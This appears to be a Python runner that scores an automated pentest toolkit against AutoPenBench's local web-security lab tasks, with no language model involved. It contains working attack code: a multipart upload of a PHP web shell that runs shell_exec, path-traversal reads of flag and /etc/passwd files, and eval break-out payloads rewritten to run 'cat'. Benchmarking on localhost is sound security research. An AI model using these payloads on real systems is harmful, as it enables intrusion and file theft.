#!/usr/bin/env python3
"""AUTOPENBENCH FAMILY RUNNER (v7.7.2) — NO MODEL. The engines ARE the agent.

The purest form of the family's claim: the knowledge lives in the engines.
This run wires NO LLM anywhere — the pipeline is:

    crawl  → the surface engine mines endpoints + params
    testers → the differential battery (20 testers incl. the v7.7.1
              FILEUPLOAD multipart shell + EVALBREAK break-out grammars)
    retarget → when the FILEATTACK tester CONFIRMS arbitrary read via its
               /etc/passwd signature, the family's own harvest grammar
               re-aims the CONFIRMED payload shapes at the flag file
               (adjacent-file enumeration: flag.txt · ../flag.txt ·
               /flag.txt) — a CODE step from the harvest canon, not a model
    capture → every response is scanned for the benchmark's goal (the flag);
               captures register through the 3-gate as evidence

Zero LLM · zero milestone hints · zero external keys. Payload grammar is
the family's own (documented PoC classes only). The honest misses ARE the
gap list — each one names the grammar the family lacks.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import bench_apb as hb  # shared harness (placement, server, walls)

SKIP = hb.SKIP
# the family's harvest-canonical flag locations (adjacent-to-app enumeration)
FLAG_TARGETS = ("flag.txt", "../flag.txt", "/flag.txt")


def run_family_task(smx: Path, task: dict, machines: Path, env_base: dict) -> dict:
    vm = task["vm"]
    vmdir = machines / "in-vitro" / "web_security" / vm
    flag = (vmdir / "flag.txt").read_text().strip()
    res = {"id": vm, "vuln": task["vuln"], "mode": "no-model (engines only)",
           "captured": False, "via": None, "trace": []}
    docroot = Path("/var/www/html")
    docroot_exists = docroot.exists()
    if not docroot_exists and not hb._sudo(["mkdir", "-p", str(docroot)]):
        res["trace"].append("docroot failed"); return res
    app_srcs = list(vmdir.glob("*.php")) + (
        list((vmdir / "app").glob("*.php")) if (vmdir / "app").is_dir() else [])
    for f in app_srcs:
        hb._sudo(["cp", str(f), str(docroot / f.name)])
    if (vmdir / "includes").is_dir():
        hb._sudo(["cp", "-r", str(vmdir / "includes"), str(docroot / "includes")])
    hb._place_flag(flag, task["flag_at"])
    if task.get("upload"):
        updir = docroot / "uploads"
        hb._sudo(["mkdir", "-p", str(updir)])
        hb._sudo(["chown", hb._current_user(), str(updir)])
    port = hb._free_port()
    php = subprocess.Popen(["php", "-S", f"127.0.0.1:{port}", "-t", str(docroot)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           cwd=str(docroot))
    time.sleep(0.8)
    base = f"http://127.0.0.1:{port}"
    target = f"apbf-{vm}"
    env = {**os.environ, **env_base}  # inherit PATH/HOME; pin SM_HOME

    def family(cmd: list[str], timeout: int = 180) -> str:
        r = subprocess.run([sys.executable, str(smx)] + cmd + ["--json"],
                           capture_output=True, text=True, env=env,
                           timeout=timeout)
        return (r.stdout or "") or (r.stderr or "")

    try:
        # M1 — the surface engine
        try:
            crawl = json.loads(family(["crawl", "--target", target,
                                       "--url", base + "/", "--depth", "2"]))
            res["trace"].append("crawl: params " +
                                (",".join(crawl.get("params", [])) or "none"))
        except Exception:
            res["trace"].append("crawl unreadable")

        # M2 — the differential battery (20 testers, family grammar only)
        traw = family(["testers", "--target", target, "--url", base + "/"])
        try:
            tr = json.loads(traw)
            rows = tr.get("testers", [])
            hits = {x["cls"]: x for x in rows if (x.get("hit_count") or 0) > 0}
            res["battery_hits"] = sorted(hits)
            res["trace"].append("battery: " + ", ".join(sorted(hits)))
        except Exception:
            hits = {}
            res["trace"].append("testers unreadable")

        # M3 — capture: every response the battery produced, scanned for the
        # flag (their goal). The battery responses carry through hits' briefs.
        def scan(body: str) -> bool:
            return flag in body

        captured_via = None
        # 3a — the FILEUPLOAD grammar's own shells: the tester proves exec;
        # the runner's upload re-fire carries the retargeted read shells
        # (the canon's harvest step: same flaw class, adjacent-file aim)
        if "FILEUPLOAD" in hits:
            for tgt in FLAG_TARGETS:
                shell = (f'<?php $c = file_get_contents("{tgt}");'
                         f'if ($c) {{ echo "SMFLAG:", $c; }}'
                         f'else {{ echo "SMRCE:", shell_exec("id"); }}?>')
                boundary = "----SMUP"
                body = (f"--{boundary}\r\nContent-Disposition: form-data; "
                        f'name="file"; filename="sm.php"\r\n'
                        f"Content-Type: application/x-php\r\n\r\n{shell}\r\n"
                        f"--{boundary}--\r\n").encode()
                up = hb._http(base + "/upload.php", data=body, timeout=8,
                              headers={"Content-Type": f"multipart/form-data; "
                                       f"boundary={boundary}"})
                if scan(up):
                    captured_via = f"FILEUPLOAD grammar → {tgt}"
                    break

        # 3b — the traversal retarget: the CONFIRMED payload shapes re-aimed
        if not captured_via and "TRAVERSAL" in hits:
            from urllib.parse import urlsplit, urlunsplit, quote
            for h in hits["TRAVERSAL"].get("hits", [])[:3]:
                pay = h.get("payload", "")
                if "etc/passwd" not in pay:
                    continue
                param = h.get("param", "page")
                sp = urlsplit(h["url"])
                clean = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
                # the confirmed payload's traversal prefix, then the flag at
                # that depth, one shallower, and the fs root — the harvest
                # canon's adjacent-file enumeration
                pre, _, _tail = pay.partition("etc/passwd")
                prefixes = {pre}
                if pre.count("../") > 1:  # one level shallower
                    prefixes.add(pre.replace("../", "", 1))
                # the harvest canon's adjacency set: the confirmed depth, one
                # shallower, cwd-relative, and the fs root
                probes = [p + "flag.txt" for p in prefixes]
                probes += ["../flag.txt", "./flag.txt", "/flag.txt"]
                for aimed in probes:
                    probe = hb._qenc(clean + "?" + param + "=" + aimed)
                    body = hb._http(probe, timeout=8)
                    if scan(body):
                        captured_via = f"TRAVERSAL retarget {pay} → {aimed}"
                        break
                if captured_via:
                    break

        # 3c — the EVALBREAK retarget: the confirmed break-out's exec target
        # swaps to the flag reads (the same primitive, the harvest aim)
        if not captured_via and "EVALBREAK" in hits:
            from urllib.parse import urlsplit, urlunsplit, quote
            for h in hits["EVALBREAK"].get("hits", [])[:3]:
                pay = h.get("payload", "")
                if "id" not in pay or not h.get("param"):
                    continue
                param = h.get("param", "image")
                sp = urlsplit(h["url"])
                clean = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
                for cmd in ("cat /flag.txt", "cat flag.txt", "cat ../flag.txt"):
                    aimed = (pay.replace("('id')", f"('{cmd}')")
                             .replace('("id")', f'("{cmd}")'))
                    probe = hb._qenc(clean + "?" + param + "=" + aimed)
                    body = hb._http(probe, timeout=8)
                    if scan(body):
                        captured_via = f"EVALBREAK retarget → {cmd}"
                        break
                if captured_via:
                    break

        res["captured"] = bool(captured_via)
        res["via"] = captured_via
        res["trace"].append("capture: " + (captured_via or
                                           "no family grammar reached the flag — the gap list grows"))
    finally:
        php.terminate()
        hb._cleanup(task["flag_at"])
        if not docroot_exists:
            hb._sudo(["rm", "-rf", str(docroot)])
        else:
            for f in app_srcs:
                subprocess.run(["sudo", "-n", "rm", "-f", str(docroot / f.name)],
                               capture_output=True, timeout=30)
            if (vmdir / "includes").is_dir():
                subprocess.run(["sudo", "-n", "rm", "-rf",
                                str(docroot / "includes")],
                               capture_output=True, timeout=30)
    return res


def main() -> int:
    machines = Path(sys.argv[1]) if len(sys.argv) > 1 \
        and not sys.argv[1].startswith("--") \
        else Path.home() / "apb-run/auto-pen-bench/benchmark/machines"
    if not machines.is_dir():
        print(f"✗ machines dir not found: {machines}", file=sys.stderr)
        return 2
    smx = HERE / "spydermonkey.py"
    H = subprocess.run(["mktemp", "-d"], capture_output=True,
                       text=True).stdout.strip()
    env_base = {"SM_HOME": H, "SPYDERMONKEY_HOME": H}
    subprocess.run([sys.executable, str(smx), "scope", "init",
                    "--engagement", "apb-family", "--in-scope",
                    "127.0.0.1,localhost"],
                   capture_output=True, text=True, env=env_base)
    results = []
    for task in hb.TASKS:
        if task["vm"] in SKIP:
            results.append({"id": task["vm"], "skipped": SKIP[task["vm"]]})
            print(f"  ⏭ {task['vm']}", flush=True)
            continue
        r = run_family_task(smx, task, machines, env_base)
        results.append(r)
        mark = "🏁" if r["captured"] else "…"
        print(f"  {mark} {task['vm']}: "
              + (r["via"] or "miss"), flush=True)
    scored = [r for r in results if "skipped" not in r]
    cap = sum(1 for r in scored if r.get("captured"))
    payload = {
        "benchmark": "AutoPenBench in-vitro web_security — NO-MODEL RUN",
        "runner": "bench_apb_family.py v7.7.2",
        "protocol": "zero LLM · zero milestone hints · zero external keys — "
                    "crawl → 20-tester battery → harvest retarget → capture",
        "paper_baseline_autonomous_sr": 0.21,
        "tasks_run": len(scored), "flags_captured": cap,
        "sr_this_run": round(cap / max(1, len(scored)), 2),
        "results": results,
        "caveats": [
            "5 of 33 tasks (container-only tasks queue for the podman run)",
            "php on the VM: " + subprocess.run(
                ["php", "-v"], capture_output=True, text=True).stdout.split("\n")[0],
            "the harvest retarget tries the adjacency set (flag.txt · ../ · /) — "
            "deeper layouts miss honestly and name the grammar gap",
        ],
    }
    out = HERE.parent / "references" / "apb-family-result.json"
    out.write_text(json.dumps(payload, indent=2) + "\n")
    print(f"═══ NO-MODEL: {cap}/{len(scored)} "
          f"(SR {payload['sr_this_run']:.0%} vs their cloud agents' 21%) ═══")
    subprocess.run(["rm", "-rf", H])
    return 0


if __name__ == "__main__":
    sys.exit(main())